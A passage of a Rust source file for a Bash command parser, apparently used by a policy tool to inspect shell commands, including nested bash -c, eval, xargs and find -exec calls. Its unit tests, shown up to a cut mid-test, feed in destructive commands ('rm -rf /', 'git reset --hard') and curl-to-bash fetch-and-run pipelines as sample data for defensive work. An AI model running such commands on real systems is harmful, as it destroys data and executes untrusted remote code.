//! Minimal shell fact extraction.
//!
//! Splits a Bash command string into segments (`;`, `&&`, `||`),
//! pipelines (`|`), and per-command [`Argv`] (env assignments + head +
//! args). Quoting (`'`, `"`, `` ` ``) is honoured so that a separator
//! inside quotes does not split the command.
//!
//! Redirects (`>`, `>>`, `<`, `2>`, `&>`) are extracted into
//! [`Pipeline::redirects`] so rules can reason about where a pipeline's
//! output lands. Heredocs (`<<TAG`, `<<-TAG`) are detected and their
//! body is captured as a `Redirect` with `RedirectOp::Heredoc`.
//! Process substitution (`<(…)` / `>(…)`) is *detected* via
//! [`Bash::has_process_substitution`] but the inner command is folded
//! into the surrounding word as opaque text. Command substitution
//! (`` `…` `` / `$(…)`) is similarly *detected* via
//! [`Bash::has_command_substitution`] without re-entry. Rules that
//! depend on accurate argv can opt in to pessimistic handling by
//! reading those flags.
//!
//! See `docs/design/architecture.md` §fact extraction.

/// A parsed Bash command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Bash {
    pub segments: Vec<Pipeline>,
    /// `true` if the source contained a `` ` … ` `` or `$(…)` command
    /// substitution. The substitution body is folded into the
    /// surrounding word as opaque text, so callers that depend on
    /// accurate argv should treat such commands pessimistically.
    pub has_command_substitution: bool,
    /// `true` if the source contained any redirect operator
    /// (`>`, `>>`, `<`, `2>`, `&>`, `<<`, `<<-`). Per-pipeline targets
    /// live in [`Pipeline::redirects`].
    pub has_redirect: bool,
    /// `true` if the source contained a heredoc (`<<TAG` / `<<-TAG`).
    /// The body is captured in [`Pipeline::redirects`] as a
    /// [`Redirect`] with [`RedirectOp::Heredoc`].
    pub has_heredoc: bool,
    /// `true` if the source contained a process substitution
    /// (`<(…)` / `>(…)`). The inner command is folded into the
    /// surrounding word as opaque text — callers should treat such
    /// commands pessimistically.
    pub has_process_substitution: bool,
}

/// One `;` / `&&` / `||`-bounded pipeline. Multiple commands inside are
/// joined by `|`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Pipeline {
    pub commands: Vec<Argv>,
    /// Redirect operators attached to this pipeline (e.g. `> file`,
    /// `>> log`, `<< EOF`). Per-command association is approximate —
    /// the lexer collects every redirect that appears in the pipeline
    /// text.
    pub redirects: Vec<Redirect>,
}

/// A redirect operator and its right-hand-side word.
///
/// For [`RedirectOp::Heredoc`] the `target` carries the heredoc body
/// (everything between the opening `<<TAG` line and the terminating
/// `TAG` line). For every other variant the `target` is the file path
/// or fd target word, with quoting stripped the same way [`Argv::args`]
/// strips it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    pub op: RedirectOp,
    pub target: String,
}

/// Variant of a redirect operator. We collapse less common forms
/// (e.g. `1>`, `n>&m`) into the closest common shape; rules only need
/// to know the rough direction.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RedirectOp {
    /// `>` — overwrite stdout to a file.
    Stdout,
    /// `>>` — append stdout to a file.
    StdoutAppend,
    /// `<` — read stdin from a file.
    Stdin,
    /// `2>` — overwrite stderr to a file.
    Stderr,
    /// `&>` — combined stdout+stderr to a file.
    Merge,
    /// `<<TAG` / `<<-TAG` — heredoc. `target` holds the body text.
    Heredoc,
}

/// A single command invocation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Argv {
    /// Leading `KEY=VALUE` env assignments (e.g. `FOO=1 cmd ...`).
    pub env_assignments: Vec<EnvAssignment>,
    /// The command head (`rm`, `/bin/rm`, `sudo`, `curl`, ...).
    pub head: String,
    /// Remaining arguments (flags + positional).
    pub args: Vec<String>,
    /// Inner commands surfaced from wrappers such as `xargs`,
    /// `find -exec`, or `bash -c`.
    pub inner_argv: Vec<Self>,
    /// Inner code blobs carried by dynamic-eval wrappers. Rules that
    /// cannot inspect `inner_argv` directly can still surface these to
    /// users or audit.
    pub inner_code: Vec<String>,
    /// Redirects surfaced from inner shell code such as `bash -c
    /// 'echo hi > file'`. Kept separate from the outer pipeline so
    /// self-protection can inspect wrapped writes.
    pub inner_redirects: Vec<Redirect>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EnvAssignment {
    pub key: String,
    pub value: String,
}

impl Argv {
    /// Iterate over arguments that look like flags (`-r`, `--recursive`).
    pub fn flags(&self) -> impl Iterator<Item = &str> {
        self.args.iter().filter(|a| is_flag(a)).map(String::as_str)
    }

    /// Iterate over positional (non-flag) arguments.
    pub fn positional(&self) -> impl Iterator<Item = &str> {
        self.args.iter().filter(|a| !is_flag(a)).map(String::as_str)
    }

    fn collect_commands<'a>(&'a self, out: &mut Vec<&'a Self>) {
        out.push(self);
        for inner in &self.inner_argv {
            inner.collect_commands(out);
        }
    }
}

impl Bash {
    /// All surfaced commands, including nested wrapper payloads such as
    /// `bash -c`, `xargs`, and `find -exec`.
    pub fn commands(&self) -> Vec<&Argv> {
        let mut out = Vec::new();
        for pipe in &self.segments {
            for command in &pipe.commands {
                command.collect_commands(&mut out);
            }
        }
        out
    }
}

const SUDO_VALUE_SHORT_FLAGS: &[char] = &['C', 'g', 'h', 'p', 'T', 't', 'U', 'u'];
const SUDO_VALUE_LONG_FLAGS: &[&str] = &[
    "close-from",
    "chdir",
    "group",
    "host",
    "login-class",
    "prompt",
    "role",
    "type",
    "user",
];

/// Return the command that `sudo` would execute.
///
/// This intentionally understands common value-taking sudo options so
/// `sudo -u root git ...` unwraps to `git ...`, not to `root ...`.
pub(crate) fn unwrap_sudo(argv: &Argv) -> Option<Argv> {
    if argv.head != "sudo" {
        return None;
    }

    let mut i = 0;
    while i < argv.args.len() {
        let arg = argv.args[i].as_str();
        if arg == "--" {
            i += 1;
            break;
        }
        if !arg.starts_with('-') || arg == "-" {
            break;
        }
        if let Some(flag) = arg.strip_prefix("--") {
            if let Some(name) = flag.split('=').next()
                && SUDO_VALUE_LONG_FLAGS.contains(&name)
                && !flag.contains('=')
            {
                i += 1;
            }
            i += 1;
            continue;
        }
        if let Some(value_flag) = short_sudo_value_flag(arg)
            && arg.len() == 2
            && arg.ends_with(value_flag)
        {
            i += 1;
        }
        i += 1;
    }

    let head = argv.args.get(i)?.clone();
    let rest = argv.args.iter().skip(i + 1).cloned().collect();
    Some(Argv {
        env_assignments: Vec::new(),
        head,
        args: rest,
        inner_argv: Vec::new(),
        inner_code: Vec::new(),
        inner_redirects: Vec::new(),
    })
}

fn short_sudo_value_flag(arg: &str) -> Option<char> {
    let mut chars = arg.strip_prefix('-')?.chars();
    let flag = chars.next()?;
    if SUDO_VALUE_SHORT_FLAGS.contains(&flag) {
        Some(flag)
    } else {
        None
    }
}

fn is_flag(a: &str) -> bool {
    a.starts_with('-') && a != "-" && a != "--"
}

/// Parse a raw Bash command string into a [`Bash`] structure.
///
/// Returns an empty `Bash` (no segments) for an entirely blank command.
pub fn parse(command: &str) -> Bash {
    parse_with_depth(command, 2)
}

fn parse_with_depth(command: &str, nesting_budget: usize) -> Bash {
    let TokenizeOutput {
        tokens,
        has_command_substitution,
        has_redirect,
        has_heredoc,
        has_process_substitution,
    } = tokenize(command);
    let segments = split_segments(tokens);
    let pipelines: Vec<Pipeline> = segments
        .into_iter()
        .map(|segment| parse_pipeline(segment, nesting_budget))
        .collect();
    Bash {
        segments: pipelines
            .into_iter()
            .filter(|p| !p.commands.is_empty() || !p.redirects.is_empty())
            .collect(),
        has_command_substitution,
        has_redirect,
        has_heredoc,
        has_process_substitution,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Word(String),
    Pipe,
    And,
    Or,
    Semi,
    Redirect(RedirectOp),
    HeredocBody(String),
}

struct TokenizeOutput {
    tokens: Vec<Token>,
    has_command_substitution: bool,
    has_redirect: bool,
    has_heredoc: bool,
    has_process_substitution: bool,
}

fn tokenize(s: &str) -> TokenizeOutput {
    let mut out = Vec::new();
    let mut saw_command_substitution = false;
    let mut saw_redirect = false;
    let mut saw_heredoc = false;
    let mut saw_process_substitution = false;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        if c.is_ascii_whitespace() {
            i += 1;
            continue;
        }
        if c == b'|' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'|' {
                out.push(Token::Or);
                i += 2;
            } else {
                out.push(Token::Pipe);
                i += 1;
            }
            continue;
        }
        if c == b'&' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'&' {
                out.push(Token::And);
                i += 2;
                continue;
            }
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                out.push(Token::Redirect(RedirectOp::Merge));
                saw_redirect = true;
                i += 2;
                continue;
            }
            // Lone `&` (background operator). ptuf does not model
            // background semantics; skip it so the lexer always makes
            // forward progress. Without this, `read_word` would return
            // (empty, 0 bytes) and `tokenize` would infinite-loop.
            i += 1;
            continue;
        }
        if c == b';' {
            out.push(Token::Semi);
            i += 1;
            continue;
        }
        // Heredoc: `<<TAG` or `<<-TAG` (must precede the bare `<` arm).
        if c == b'<' && i + 1 < bytes.len() && bytes[i + 1] == b'<' {
            let mut j = i + 2;
            if j < bytes.len() && bytes[j] == b'-' {
                j += 1;
            }
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            let (tag, tag_len, _) = read_word(&bytes[j..]);
            if !tag.is_empty() {
                j += tag_len;
                let body = read_heredoc_body(&bytes[j..], &tag);
                out.push(Token::Redirect(RedirectOp::Heredoc));
                out.push(Token::HeredocBody(body.text));
                saw_redirect = true;
                saw_heredoc = true;
                i = j + body.consumed;
                continue;
            }
            // Empty tag: degrade gracefully and emit a plain `<` redirect
            // (consume the leading two `<` bytes only) so the loop still
            // makes forward progress.
            out.push(Token::Redirect(RedirectOp::Stdin));
            saw_redirect = true;
            i += 2;
            continue;
        }
        if c == b'<' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'(' {
                // Process substitution: fold into a word (opaque) and flag.
                let (word, advanced, word_subst) = read_word(&bytes[i..]);
                debug_assert!(advanced > 0, "read_word must consume at least one byte");
                if word_subst {
                    saw_command_substitution = true;
                }
                saw_process_substitution = true;
                out.push(Token::Word(word));
                i += advanced;
                continue;
            }
            out.push(Token::Redirect(RedirectOp::Stdin));
            saw_redirect = true;
            i += 1;
            continue;
        }
        if c == b'>' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'(' {
                let (word, advanced, word_subst) = read_word(&bytes[i..]);
                debug_assert!(advanced > 0, "read_word must consume at least one byte");
                if word_subst {
                    saw_command_substitution = true;
                }
                saw_process_substitution = true;
                out.push(Token::Word(word));
                i += advanced;
                continue;
            }
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                out.push(Token::Redirect(RedirectOp::StdoutAppend));
                saw_redirect = true;
                i += 2;
            } else {
                out.push(Token::Redirect(RedirectOp::Stdout));
                saw_redirect = true;
                i += 1;
            }
            continue;
        }
        // `2>` / `2>>` only when it appears at the start of a word
        // position (the whitespace skip above guarantees that).
        if c == b'2' && i + 1 < bytes.len() && bytes[i + 1] == b'>' {
            // Collapse `2>>` into Stderr (we only model rough direction).
            let advance = if i + 2 < bytes.len() && bytes[i + 2] == b'>' {
                3
            } else {
                2
            };
            out.push(Token::Redirect(RedirectOp::Stderr));
            saw_redirect = true;
            i += advance;
            continue;
        }
        // Otherwise: read a word, honouring quotes.
        let (word, advanced, word_subst) = read_word(&bytes[i..]);
        // Forward-progress invariant: every separator and whitespace
        // byte is consumed above, so `read_word` is always called on a
        // non-trivial first byte and must advance by at least 1. The
        // assertion documents this; if a future change adds a code path
        // that returns 0, debug builds fail fast instead of looping.
        debug_assert!(advanced > 0, "read_word must consume at least one byte");
        if word_subst {
            saw_command_substitution = true;
        }
        out.push(Token::Word(word));
        i += advanced;
    }
    TokenizeOutput {
        tokens: out,
        has_command_substitution: saw_command_substitution,
        has_redirect: saw_redirect,
        has_heredoc: saw_heredoc,
        has_process_substitution: saw_process_substitution,
    }
}

struct HeredocBody {
    text: String,
    consumed: usize,
}

/// Read a heredoc body that opened with `<<TAG`. The body runs from the
/// next byte after the tag (which is expected to be a newline) up to a
/// line that contains exactly `TAG`. If no terminator is found the rest
/// of the input is consumed.
fn read_heredoc_body(bytes: &[u8], tag: &str) -> HeredocBody {
    let mut i = 0;
    if i < bytes.len() && bytes[i] == b'\n' {
        i += 1;
    }
    let body_start = i;
    let tag_bytes = tag.as_bytes();
    while i < bytes.len() {
        let line_start = i;
        // Heredoc-`<<-` strips leading tabs from the closing tag and
        // body lines; we accept either form as terminator without
        // distinguishing the two operators in surfaced facts.
        let mut probe = line_start;
        while probe < bytes.len() && bytes[probe] == b'\t' {
            probe += 1;
        }
        if bytes.len() - probe >= tag_bytes.len()
            && &bytes[probe..probe + tag_bytes.len()] == tag_bytes
        {
            let after_tag = probe + tag_bytes.len();
            let line_end_is_terminator = after_tag == bytes.len() || bytes[after_tag] == b'\n';
            if line_end_is_terminator {
                let body_text = std::str::from_utf8(&bytes[body_start..line_start])
                    .unwrap_or("")
                    .to_string();
                let consumed = if after_tag < bytes.len() {
                    after_tag + 1
                } else {
                    after_tag
                };
                return HeredocBody {
                    text: body_text,
                    consumed,
                };
            }
        }
        // Advance to next line.
        while i < bytes.len() && bytes[i] != b'\n' {
            i += 1;
        }
        if i < bytes.len() {
            i += 1;
        }
    }
    let body_text = std::str::from_utf8(&bytes[body_start..])
        .unwrap_or("")
        .to_string();
    HeredocBody {
        text: body_text,
        consumed: bytes.len(),
    }
}

/// Read a single shell "word" starting at `bytes[0]`. Quoted spans
/// (`'`, `"`, `` ` ``) are absorbed into the word with their delimiters
/// stripped. Returns the decoded word, the number of bytes consumed,
/// and a flag set when the word contained a `` ` `` or `$(` command
/// substitution opening.
///
/// The caller is expected to skip whitespace and the separator bytes
/// (`|`, `&`, `;`) before calling — under that contract this function
/// always consumes at least one byte.
fn read_word(bytes: &[u8]) -> (String, usize, bool) {
    let mut buf = String::new();
    let mut i = 0;
    let mut saw_subst = false;
    while i < bytes.len() {
        let c = bytes[i];
        if c.is_ascii_whitespace() {
            break;
        }
        if matches!(c, b'|' | b'&' | b';') {
            break;
        }
        if c == b'\\' && i + 1 < bytes.len() {
            buf.push(bytes[i + 1] as char);
            i += 2;
            continue;
        }
        // Process substitution `<(…)` / `>(…)`: absorb the entire
        // parenthesised group as opaque text, balancing nested
        // parens. Without this, an inner `|` would terminate the word
        // mid-expression and corrupt the pipeline structure.
        if (c == b'<' || c == b'>') && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
            buf.push(c as char);
            buf.push('(');
            i += 2;
            let mut depth: usize = 1;
            while i < bytes.len() && depth > 0 {
                let pc = bytes[i];
                if pc == b'(' {
                    depth += 1;
                } else if pc == b')' {
                    depth -= 1;
                    if depth == 0 {
                        buf.push(')');
                        i += 1;
                        break;
                    }
                }
                buf.push(pc as char);
                i += 1;
            }
            continue;
        }
        // Unquoted `$(`: command substitution. Body bytes fall through
        // and are folded into the word as opaque text.
        if c == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
            saw_subst = true;
        }
        if c == b'\'' || c == b'"' || c == b'`' {
            if c == b'`' {
                saw_subst = true;
            }
            let quote = c;
            i += 1;
            while i < bytes.len() && bytes[i] != quote {
                if quote == b'"' && bytes[i] == b'\\' && i + 1 < bytes.len() {
                    buf.push(bytes[i + 1] as char);
                    i += 2;
                    continue;
                }
                // `$(` inside a double-quoted span is still a command
                // substitution. Single-quoted spans are literal so the
                // sequence does not count there.
                if quote == b'"' && bytes[i] == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'('
                {
                    saw_subst = true;
                }
                buf.push(bytes[i] as char);
                i += 1;
            }
            if i < bytes.len() {
                i += 1; // closing quote
            }
            continue;
        }
        buf.push(c as char);
        i += 1;
    }
    (buf, i, saw_subst)
}

fn split_segments(tokens: Vec<Token>) -> Vec<Vec<Token>> {
    let mut segments = Vec::new();
    let mut current = Vec::new();
    for tok in tokens {
        match tok {
            Token::And | Token::Or | Token::Semi => {
                if !current.is_empty() {
                    segments.push(std::mem::take(&mut current));
                }
            },
            other => current.push(other),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

fn parse_pipeline(tokens: Vec<Token>, nesting_budget: usize) -> Pipeline {
    let mut commands = Vec::new();
    let mut redirects = Vec::new();
    let mut current_words: Vec<String> = Vec::new();
    let mut iter = tokens.into_iter();
    while let Some(tok) = iter.next() {
        match tok {
            Token::Word(w) => current_words.push(w),
            Token::Pipe => {
                if !current_words.is_empty() {
                    commands.push(parse_argv(
                        std::mem::take(&mut current_words),
                        nesting_budget,
                    ));
                }
            },
            Token::Redirect(op) => {
                let target = take_redirect_target(&mut iter, op, &mut current_words);
                redirects.push(Redirect { op, target });
            },
            Token::HeredocBody(_) => {},
            Token::And | Token::Or | Token::Semi => {},
        }
    }
    if !current_words.is_empty() {
        commands.push(parse_argv(current_words, nesting_budget));
    }
    Pipeline {
        commands,
        redirects,
    }
}

/// Pull the word following a redirect operator. For `Heredoc`, expect a
/// `HeredocBody` token; otherwise expect a `Word`. If the next token is
/// something else (parser drift), put it back into `current_words` when
/// it is a stray `Word` so we do not silently lose user input, and yield
/// an empty target so the redirect itself is still surfaced.
fn take_redirect_target(
    iter: &mut std::vec::IntoIter<Token>,
    op: RedirectOp,
    current_words: &mut Vec<String>,
) -> String {
    let next = iter.next();
    match (op, next) {
        (RedirectOp::Heredoc, Some(Token::HeredocBody(b))) => b,
        (_, Some(Token::Word(w))) if op != RedirectOp::Heredoc => w,
        (_, Some(Token::Word(w))) => {
            current_words.push(w);
            String::new()
        },
        _ => String::new(),
    }
}

fn parse_argv(words: Vec<String>, nesting_budget: usize) -> Argv {
    // VecDeque so the head-stripping loop runs in O(N) overall instead
    // of O(N²) — `Vec::remove(0)` shifts every remaining element.
    let mut words: std::collections::VecDeque<String> = words.into();
    let mut env_assignments = Vec::new();
    while let Some(first) = words.front() {
        match split_env_assignment(first) {
            Some((k, v)) => {
                env_assignments.push(EnvAssignment { key: k, value: v });
                words.pop_front();
            },
            None => break,
        }
    }
    let head = words.pop_front().unwrap_or_default();
    let mut argv = Argv {
        env_assignments,
        head,
        args: words.into(),
        inner_argv: Vec::new(),
        inner_code: Vec::new(),
        inner_redirects: Vec::new(),
    };
    if nesting_budget > 0 {
        augment_inner_commands(&mut argv, nesting_budget - 1);
    }
    argv
}

fn augment_inner_commands(argv: &mut Argv, nesting_budget: usize) {
    if let Some(code) = extract_shell_dash_c(argv) {
        merge_inner_shell(argv, &code, nesting_budget);
    }
    if let Some(code) = extract_eval_code(argv) {
        merge_inner_shell(argv, &code, nesting_budget);
    }
    if let Some(inner) = extract_xargs_inner(argv, nesting_budget) {
        argv.inner_argv.push(inner);
    }
    if let Some(inner) = extract_find_exec_inner(argv, nesting_budget) {
        argv.inner_argv.push(inner);
    }
}

fn merge_inner_shell(argv: &mut Argv, code: &str, nesting_budget: usize) {
    argv.inner_code.push(code.to_string());
    let inner = parse_inner_shell(code, nesting_budget);
    argv.inner_argv.extend(inner.commands);
    argv.inner_redirects.extend(inner.redirects);
}

struct InnerShell {
    commands: Vec<Argv>,
    redirects: Vec<Redirect>,
}

fn parse_inner_shell(code: &str, nesting_budget: usize) -> InnerShell {
    let inner = parse_with_depth(code, nesting_budget);
    let mut commands = Vec::new();
    let mut redirects = Vec::new();
    for segment in inner.segments {
        redirects.extend(segment.redirects.iter().cloned());
        commands.extend(segment.commands);
    }
    InnerShell {
        commands,
        redirects,
    }
}

fn extract_shell_dash_c(argv: &Argv) -> Option<String> {
    if !is_shell_dash_c_head(&argv.head) {
        return None;
    }
    let mut iter = argv.args.iter();
    while let Some(arg) = iter.next() {
        if short_flag_cluster_contains(arg, 'c') {
            return iter.next().cloned();
        }
    }
    None
}

fn is_shell_dash_c_head(head: &str) -> bool {
    matches!(
        head_basename(head),
        "bash" | "sh" | "zsh" | "ksh" | "dash" | "fish"
    )
}

fn extract_eval_code(argv: &Argv) -> Option<String> {
    if head_basename(&argv.head) != "eval" {
        return None;
    }
    argv.args.iter().find(|arg| !arg.starts_with('-')).cloned()
}

fn extract_xargs_inner(argv: &Argv, nesting_budget: usize) -> Option<Argv> {
    if head_basename(&argv.head) != "xargs" {
        return None;
    }
    let start = xargs_command_start(&argv.args)?;
    let words: Vec<String> = argv.args.iter().skip(start).cloned().collect();
    if words.is_empty() {
        return None;
    }
    Some(parse_argv(words, nesting_budget))
}

fn xargs_command_start(args: &[String]) -> Option<usize> {
    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        if arg == "--" {
            return (i + 1 < args.len()).then_some(i + 1);
        }
        if !arg.starts_with('-') || arg == "-" {
            return Some(i);
        }
        if xargs_flag_takes_value(arg) && i + 1 < args.len() && !arg.contains('=') {
            i += 2;
        } else {
            i += 1;
        }
    }
    None
}

fn xargs_flag_takes_value(arg: &str) -> bool {
    matches!(
        arg,
        "-a" | "-d"
            | "-E"
            | "-e"
            | "-I"
            | "-i"
            | "-L"
            | "-l"
            | "-n"
            | "-P"
            | "-s"
            | "--arg-file"
            | "--delimiter"
            | "--eof"
            | "--eof-str"
            | "--replace"
            | "--max-lines"
            | "--max-args"
            | "--max-procs"
            | "--max-chars"
    )
}

fn extract_find_exec_inner(argv: &Argv, nesting_budget: usize) -> Option<Argv> {
    if head_basename(&argv.head) != "find" {
        return None;
    }
    let start = argv
        .args
        .iter()
        .position(|arg| arg == "-exec" || arg == "-execdir")?;
    let end = argv
        .args
        .iter()
        .skip(start + 1)
        .position(|arg| arg == ";" || arg == "+")?;
    let words: Vec<String> = argv
        .args
        .iter()
        .skip(start + 1)
        .take(end)
        .filter(|arg| arg.as_str() != "{}")
        .cloned()
        .collect();
    if words.is_empty() {
        return None;
    }
    Some(parse_argv(words, nesting_budget))
}

fn head_basename(head: &str) -> &str {
    head.rsplit('/').next().unwrap_or(head)
}

fn short_flag_cluster_contains(arg: &str, flag: char) -> bool {
    let Some(rest) = arg.strip_prefix('-') else {
        return false;
    };
    if rest.starts_with('-') || rest.is_empty() {
        return false;
    }
    rest.chars().any(|c| c == flag)
}

fn split_env_assignment(word: &str) -> Option<(String, String)> {
    let eq = word.find('=')?;
    if eq == 0 {
        return None;
    }
    let key = &word[..eq];
    if !key
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
    {
        return None;
    }
    if !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return None;
    }
    Some((key.to_string(), word[eq + 1..].to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(head: &str, args: &[&str]) -> Argv {
        Argv {
            env_assignments: Vec::new(),
            head: head.to_string(),
            args: args.iter().map(|s| s.to_string()).collect(),
            inner_argv: Vec::new(),
            inner_code: Vec::new(),
            inner_redirects: Vec::new(),
        }
    }

    #[test]
    fn parses_simple_command() {
        let b = parse("rm -rf /");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands, vec![argv("rm", &["-rf", "/"])]);
    }

    #[test]
    fn parses_empty_command() {
        let b = parse("");
        assert!(b.segments.is_empty());
    }

    #[test]
    fn parses_blank_command() {
        let b = parse("   \t  ");
        assert!(b.segments.is_empty());
    }

    #[test]
    fn splits_on_semicolon() {
        let b = parse("ls; rm -rf /etc");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].commands[0], argv("ls", &[]));
        assert_eq!(b.segments[1].commands[0], argv("rm", &["-rf", "/etc"]));
    }

    #[test]
    fn splits_on_and_and_or() {
        let b = parse("a && b || c");
        assert_eq!(b.segments.len(), 3);
        assert_eq!(b.segments[0].commands[0].head, "a");
        assert_eq!(b.segments[1].commands[0].head, "b");
        assert_eq!(b.segments[2].commands[0].head, "c");
    }

    #[test]
    fn splits_pipelines_within_segment() {
        let b = parse("curl -fsSL https://example.com/i.sh | bash");
        assert_eq!(b.segments.len(), 1);
        let cmds = &b.segments[0].commands;
        assert_eq!(cmds.len(), 2);
        assert_eq!(cmds[0].head, "curl");
        assert_eq!(
            cmds[0].args,
            vec!["-fsSL".to_string(), "https://example.com/i.sh".to_string()]
        );
        assert_eq!(cmds[1], argv("bash", &[]));
    }

    #[test]
    fn pipeline_in_compound_command() {
        let b = parse("echo go && curl x | sh");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].commands.len(), 1);
        assert_eq!(b.segments[1].commands.len(), 2);
        assert_eq!(b.segments[1].commands[1].head, "sh");
    }

    #[test]
    fn quotes_protect_separators() {
        let b = parse("echo 'a;b' \"c|d\"");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0], argv("echo", &["a;b", "c|d"]));
    }

    #[test]
    fn strips_quote_delimiters_from_words() {
        let b = parse(r#"rm -rf "${HOME}""#);
        assert_eq!(b.segments[0].commands[0], argv("rm", &["-rf", "${HOME}"]));
    }

    #[test]
    fn collects_env_assignments_before_head() {
        let b = parse("FOO=1 BAR=baz cmd --flag");
        let cmd = &b.segments[0].commands[0];
        assert_eq!(cmd.head, "cmd");
        assert_eq!(cmd.args, vec!["--flag".to_string()]);
        assert_eq!(
            cmd.env_assignments,
            vec![
                EnvAssignment {
                    key: "FOO".into(),
                    value: "1".into(),
                },
                EnvAssignment {
                    key: "BAR".into(),
                    value: "baz".into(),
                },
            ]
        );
    }

    #[test]
    fn does_not_treat_url_as_env_assignment() {
        // `https://...` has `://` not `=`, but verify that a URL with a
        // query string is still treated as a single arg, not as an env.
        let b = parse("curl https://example.com/?key=value");
        let cmd = &b.segments[0].commands[0];
        assert_eq!(cmd.head, "curl");
        assert!(cmd.env_assignments.is_empty());
    }

    #[test]
    fn rejects_env_with_non_identifier_key() {
        // `1FOO=bar` is not a valid env key (starts with digit).
        let b = parse("1FOO=bar cmd");
        let first = &b.segments[0].commands[0];
        assert_eq!(first.head, "1FOO=bar");
        assert!(first.env_assignments.is_empty());
    }

    #[test]
    fn flags_iterator_filters_dash_args() {
        let cmd = argv("rm", &["-rf", "--force", "/etc", "build"]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["-rf", "--force"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["/etc", "build"]);
    }

    #[test]
    fn lone_dash_is_not_a_flag() {
        let cmd = argv("tar", &["-czf", "-", "."]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["-czf"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["-", "."]);
    }

    #[test]
    fn double_dash_separator_is_not_a_flag() {
        let cmd = argv("rm", &["--", "--weird-file"]);
        let flags: Vec<_> = cmd.flags().collect();
        assert_eq!(flags, vec!["--weird-file"]);
        let pos: Vec<_> = cmd.positional().collect();
        assert_eq!(pos, vec!["--"]);
    }

    #[test]
    fn full_path_command_keeps_head_intact() {
        let b = parse("/usr/bin/rm -rf /etc");
        assert_eq!(b.segments[0].commands[0].head, "/usr/bin/rm");
    }

    #[test]
    fn double_pipe_is_or_not_pipeline() {
        let b = parse("a || b");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].commands[0].head, "a");
        assert_eq!(b.segments[1].commands[0].head, "b");
    }

    #[test]
    fn handles_backslash_escapes_outside_quotes() {
        let b = parse(r"echo a\;b");
        // Outside quotes, `\;` should escape the `;` so it becomes part
        // of the word rather than splitting segments.
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0], argv("echo", &["a;b"]));
    }

    #[test]
    fn handles_backtick_substring_as_word_chunk() {
        let b = parse("echo `date`");
        assert_eq!(b.segments[0].commands[0], argv("echo", &["date"]));
        // Backtick must mark the whole command as containing a
        // substitution so rules can opt into pessimistic handling.
        assert!(b.has_command_substitution);
    }

    #[test]
    fn flags_command_substitution_on_dollar_paren() {
        let b = parse("echo $(date)");
        assert!(b.has_command_substitution);
    }

    #[test]
    fn flags_command_substitution_inside_double_quotes() {
        let b = parse(r#"echo "hello $(whoami)""#);
        assert!(b.has_command_substitution);
    }

    #[test]
    fn does_not_flag_dollar_paren_inside_single_quotes() {
        // Single-quoted spans are literal, so `$(...)` inside is data.
        let b = parse("echo '$(date)'");
        assert!(!b.has_command_substitution);
    }

    #[test]
    fn does_not_flag_plain_command() {
        let b = parse("ls -la /etc");
        assert!(!b.has_command_substitution);
    }

    #[test]
    fn ignores_trailing_separator() {
        let b = parse("ls;");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands[0].head, "ls");
    }

    #[test]
    fn complex_compound_pipeline() {
        let b = parse("FOO=1 curl -fsSL https://x | sudo bash; ls -la");
        assert_eq!(b.segments.len(), 2);
        let first = &b.segments[0].commands;
        assert_eq!(first.len(), 2);
        assert_eq!(first[0].head, "curl");
        assert_eq!(
            first[0].env_assignments,
            vec![EnvAssignment {
                key: "FOO".into(),
                value: "1".into(),
            }]
        );
        assert_eq!(first[1].head, "sudo");
        assert_eq!(first[1].args, vec!["bash".to_string()]);
        assert_eq!(b.segments[1].commands[0].head, "ls");
    }

    #[test]
    fn parses_bash_dash_c_inner_command() {
        let b = parse("bash -c 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
        assert_eq!(b.segments[0].commands[0].inner_code, vec!["rm -rf /"]);
    }

    #[test]
    fn parses_combined_shell_short_options_with_dash_c() {
        let b = parse("bash -lc 'rm -rf /'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn parses_eval_inner_command() {
        let b = parse("eval 'git reset --hard HEAD~1'");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
